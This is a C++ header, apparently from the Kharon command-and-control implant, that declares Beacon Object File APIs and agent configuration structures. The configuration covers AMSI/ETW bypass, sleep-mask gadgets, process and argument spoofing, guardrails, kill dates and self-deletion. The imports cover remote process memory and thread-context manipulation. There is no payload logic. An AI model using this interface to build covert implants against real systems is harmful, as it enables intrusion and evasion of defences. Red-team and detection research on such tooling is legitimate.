#pragma once
#include <windows.h>

#define CALLBACK_NO_PRE_MSG  0x4f
#define CALLBACK_OUTPUT      0x0
#define CALLBACK_SCREENSHOT  0x55
#define CALLBACK_INFO        0x4e
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_ERROR       0x0d
#define CALLBACK_OUTPUT_UTF8 0x20

/// @struct Represents a managed data buffer with additional metadata.
struct datap {
    /// Pointer to the original buffer.
    PCHAR Original;

    /// Pointer to the current position in the buffer.
    PCHAR Buffer;

    /// Remaining length of the buffer.
    INT Length;

    /// Total size of the buffer.
    INT Size;
};

/// @struct Represents a managed data buffer with metadata for tracking its state.
struct fmt {
    /// Pointer to the original buffer.
    PCHAR Original;

    /// Pointer to the current position in the buffer.
    PCHAR Buffer;

    /// Remaining length in the buffer.
    INT Length;

    /// Total size of the buffer.
    INT Size;
};

#define DATA_STORE_TYPE_EMPTY        0
#define DATA_STORE_TYPE_GENERAL_FILE 1

typedef struct _MM_INFO {
    PBYTE  Ptr;
    SIZE_T Size;
} MM_INFO;

enum class Base64Action {
    Get_Size,
    Encode,
    Decode
};

enum class Base64URLAction {
    Get_Size,
    Encode,
    Decode
};

enum class Base32Action {
    Get_Size,
    Encode,
    Decode
};

enum class HexAction {
    Get_Size,
    Encode,
    Decode
};

typedef enum class OutputFmt {
    Raw,
    Hex,
    Base32,
    Base64,
    Base64Url
};

typedef enum _INPUT_TYPE {
    Input_Header,
    Input_Body
} INPUT_TYPE;

typedef enum _OUTPUT_TYPE {
    Output_Parameter,
    Output_Header,
    Output_Body,
    Output_Cookie
} OUTPUT_TYPE;

typedef struct _ARRAY_PAIRA {
    CHAR* Key;
    CHAR* Value;
} ARRAY_PAIRA;

typedef struct _ARRAY_PAIRW {
    WCHAR* Key;
    WCHAR* Value;
} ARRAY_PAIRW;

typedef struct _OUTPUT_FORMAT {
    OUTPUT_TYPE Type;
    OutputFmt   Format;
    BOOL        Mask;
    
    union { 
        struct {
            WCHAR* Ptr;
            ULONG  Size;
        } Parameter;

        struct {
            WCHAR* Ptr;
            ULONG  Size;
        } Cookie;

        struct {
            WCHAR* Ptr;
            ULONG  Size;
        } Header;

        struct {
            PBYTE Ptr; 
            ULONG Size;
        } Body;

        struct {
            PBYTE Ptr; 
            ULONG Size;
        } OutputBuff;
    };

    ULONG MaxDataSize;

    MM_INFO Append;
    MM_INFO Prepend;
    MM_INFO FalseBody;
} OUTPUT_FORMAT;

typedef struct _HTTP_ENDPOINT {
    WCHAR*         Path;
    OUTPUT_FORMAT  ServerOutput;
    OUTPUT_FORMAT  ClientOutput;
    
    MM_INFO        Parameters;
} HTTP_ENDPOINT;

typedef struct _HTTP_METHOD_ENDPOINTS {
    HTTP_ENDPOINT** Endpoints;      
    ULONG           EndpointCount;  

    WCHAR*          Headers;
    
    ARRAY_PAIRW**   Cookies;
    ULONG           CookiesCount;

    MM_INFO         DoNothingBuff;
} HTTP_METHOD;

typedef struct _HTTP_CALLBACKS {
    WCHAR*       Host;
    ULONG        Port;
    
    WCHAR*       UserAgent;
    
    ULONG        Method;
    HTTP_METHOD  Get;           // Endpoints GET
    HTTP_METHOD  Post;          // Endpoints POST
} HTTP_CALLBACKS;

typedef struct _PROXY_SETTINGS {
    BOOL Enabled;
    
    WCHAR* Url;
    WCHAR* Username;
    WCHAR* Password;
} PROXY_SETTINGS;

typedef struct {
	int type;
	DWORD64 hash;
	BOOL masked;
	char* buffer;
	size_t length;
} DATA_STORE_OBJECT, *PDATA_STORE_OBJECT;

typedef struct {
    CHAR* AgentId;
    ULONG SleepTime;
    ULONG Jitter;
    BYTE  EncryptKey[16];
    ULONG BofProxy;
    BOOL  Syscall;
    ULONG AmsiEtwBypass;
    ULONG ChunkSize;

    ULONG Profile;

    struct {
        ULONG  ParentID;
        BOOL   Pipe;
        BOOL   BlockDlls;
        WCHAR* CurrentDir;
        WCHAR* SpoofArg;
    } Ps;

    struct {
        WCHAR* Spawnto;
        PCHAR  ForkPipe;
        PCHAR  CurrentUUID;
    } Postex;

    struct {
        CHAR* UserName;
        CHAR* DomainName;
        CHAR* IpAddress;
        CHAR* HostName;
    } Guardrails;

    struct {
        UINT8 Beacon;
        BOOL  Heap;

        UINT_PTR NtContinueGadget;
        UINT_PTR JmpGadget;
    } Mask;

    struct {
        BOOL Enabled;

        INT16 StartHour;
        INT16 StartMin;

        INT16 EndHour;
        INT16 EndMin;
    } Worktime;

    struct {
        BOOL Enabled;
        BOOL SelfDelete; // if true, self delete the process binary of the disk (care should be taken within a grafted process to exclude an accidentally unintended binary.)
        BOOL ExitProc;   // if true, exit the process, else exit the thread

        INT16 Day;
        INT16 Month;
        INT16 Year;
    } KillDate;

    struct {
        PROXY_SETTINGS   Proxy;
        BOOL             Secure;
        ULONG            Strategy;
        ULONG            CallbacksCount;
        HTTP_CALLBACKS** Callbacks;
    } Http;
} KHARON_CONFIG;

typedef struct {
    PVOID   Buffer;
    size_t  Length;
    size_t  Size;
    ULONG   Reserved1;
    PVOID   Reserved2;
} PACKAGE, *PPACKAGE;

struct _BEACON_INFO {
    PBYTE BeaconPtr;
    ULONG BeaconLength;

    struct {
        CHAR*  AgentId;
        WCHAR* CommandLine;
        WCHAR* ImagePath;
        ULONG  ProcessId;
        BOOL   Elevated;
    } Session;

    struct {
        PVOID NodeHead;
        ULONG EntryCount;
    } HeapRecords;

    KHARON_CONFIG* Config;
};
typedef _BEACON_INFO BEACON_INFO;

EXTERN_C {
    DECLSPEC_IMPORT VOID  BeaconPrintf         (INT Type, const char* Fmt, ...);
    DECLSPEC_IMPORT VOID  BeaconPrintfW        (INT Type, const wchar_t* Fmt, ...);
    DECLSPEC_IMPORT VOID  BeaconOutput         (INT Type, PCHAR Data, INT Len);
    DECLSPEC_IMPORT BOOL  BeaconUseToken       (HANDLE Token);
    DECLSPEC_IMPORT VOID  BeaconRevertToken    ();
    DECLSPEC_IMPORT BOOL  BeaconIsAdmin        ();

    DECLSPEC_IMPORT VOID  BeaconDataParse      (datap* Parser, PCHAR Buffer, INT Size);
    DECLSPEC_IMPORT INT   BeaconDataInt        (datap* Parser);
    DECLSPEC_IMPORT SHORT BeaconDataShort      (datap* Parser);
    DECLSPEC_IMPORT INT   BeaconDataLength     (datap* Parser);
    DECLSPEC_IMPORT PCHAR BeaconDataExtract    (datap* Parser, PINT Size);

    DECLSPEC_IMPORT PVOID BeaconHeapAlloc( ULONG size );
    DECLSPEC_IMPORT PVOID BeaconHeapReAlloc( PVOID block, ULONG size );
    DECLSPEC_IMPORT BOOL  BeaconHeapFree( PVOID block );
    DECLSPEC_IMPORT BOOL  BeaconHeapCheckPtr( PVOID block );

    DECLSPEC_IMPORT VOID  BeaconFormatAlloc    (fmt* Format, INT Maxsz);
    DECLSPEC_IMPORT VOID  BeaconFormatReset    (fmt* Format);
    DECLSPEC_IMPORT VOID  BeaconFormatFree     (fmt* Format);
    DECLSPEC_IMPORT VOID  BeaconFormatAppend   (fmt* Format, PCHAR Text, INT Len);
    DECLSPEC_IMPORT VOID  BeaconFormatPrintf   (fmt* Format, PCHAR Fmt, ...);
    DECLSPEC_IMPORT PCHAR BeaconFormatToString (fmt* Format, PINT Size);
    DECLSPEC_IMPORT VOID  BeaconFormatInt      (fmt* Format, INT Value);

    DECLSPEC_IMPORT BOOL  BeaconAddValue(PCCH Key, PVOID Ptr);
    DECLSPEC_IMPORT PVOID BeaconGetValue(PCCH Key);
    DECLSPEC_IMPORT BOOL  BeaconRemoveValue(PCCH Key);

    DECLSPEC_IMPORT VOID BeaconPkgBytes( PBYTE Buffer, ULONG Length, PCHAR UUID = nullptr );
    DECLSPEC_IMPORT VOID BeaconPkgInt8( INT8 Data, PCHAR UUID = nullptr );
    DECLSPEC_IMPORT VOID BeaconPkgInt16( INT16 Data, PCHAR UUID = nullptr );
    DECLSPEC_IMPORT VOID BeaconPkgInt32( INT32 Data, PCHAR UUID = nullptr );
    DECLSPEC_IMPORT VOID BeaconPkgInt64( INT64 Data, PCHAR UUID = nullptr );

    DECLSPEC_IMPORT BOOL BeaconInformation( BEACON_INFO* info );

    DECLSPEC_IMPORT PDATA_STORE_OBJECT BeaconDataStoreGetItem(SIZE_T Index);
    DECLSPEC_IMPORT VOID   BeaconDataStoreProtectItem(SIZE_T Index);
    DECLSPEC_IMPORT VOID   BeaconDataStoreUnprotectItem(SIZE_T Index);
    DECLSPEC_IMPORT SIZE_T BeaconDataStoreMaxEntries();
    DECLSPEC_IMPORT PVOID  BeaconVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    DECLSPEC_IMPORT PVOID  BeaconVirtualAllocEx(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    DECLSPEC_IMPORT PVOID  BeaconDripAlloc(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    DECLSPEC_IMPORT BOOL   BeaconVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    DECLSPEC_IMPORT BOOL   BeaconVirtualProtectEx(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    DECLSPEC_IMPORT BOOL   BeaconVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
    DECLSPEC_IMPORT BOOL   BeaconGetThreadContext(HANDLE threadHandle, PCONTEXT threadContext);
    DECLSPEC_IMPORT BOOL   BeaconSetThreadContext(HANDLE threadHandle, PCONTEXT threadContext);
    DECLSPEC_IMPORT DWORD  BeaconResumeThread(HANDLE threadHandle);
    DECLSPEC_IMPORT HANDLE BeaconOpenProcess(DWORD desiredAccess, BOOL inheritHandle, DWORD processId);
    DECLSPEC_IMPORT HANDLE BeaconOpenThread(DWORD desiredAccess, BOOL inheritHandle, DWORD threadId);
    DECLSPEC_IMPORT SIZE_T BeaconVirtualQuery(LPCVOID address, PMEMORY_BASIC_INFORMATION buffer, SIZE_T length);
    DECLSPEC_IMPORT BOOL   BeaconReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
}